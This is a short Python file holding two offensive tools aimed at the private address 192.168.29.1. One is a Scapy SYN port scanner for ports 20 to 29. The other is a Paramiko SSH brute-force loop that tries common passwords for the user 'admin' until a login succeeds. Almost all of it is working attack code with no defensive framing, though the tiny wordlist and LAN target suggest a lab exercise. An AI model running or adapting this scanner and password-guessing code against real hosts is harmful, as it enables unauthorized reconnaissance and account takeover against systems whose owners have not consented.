from scapy.all import conf

conf.use_pcap = True



from scapy.all import sr1, IP, TCP, conf

conf.use_pcap = True

def scan_ports(target_ip, port_range):
    open_ports = []
    for port in port_range:
        print(f"Scanning port: {port}")
        pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=0.5, verbose=0)
        if resp and resp.getlayer(TCP).flags == 0x12:
            open_ports.append(port)
            print(f"Port {port} is open")
    return open_ports

if __name__ == "__main__":
    target = "192.168.29.1"
    ports = range(20, 30)
    print(f"Starting port scan on {target} for ports {min(ports)} to {max(ports)}")
    open_ports = scan_ports(target, ports)
    print(f"Open ports on {target}: {open_ports}")


import paramiko

def ssh_brute_force(target_ip, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        print(f"Trying password: {password}")  
        try:
            ssh.connect(target_ip, username=username, password=password, timeout=10) 
            print(f"Success: Username: {username} Password: {password}")
            return
        except paramiko.AuthenticationException:
            print(f"Failed: Username: {username} Password: {password}")  
        except paramiko.SSHException as e:
            print(f"SSHException: {str(e)}")  
        except Exception as e:
            print(f"Error: {str(e)}")  
    print("Brute-force attack failed.")




if __name__ == "__main__":
    target = "192.168.29.1" 
    username = "admin"  
    passwords = ["12345", "password", "admin"] 
    ssh_brute_force(target, username, passwords)




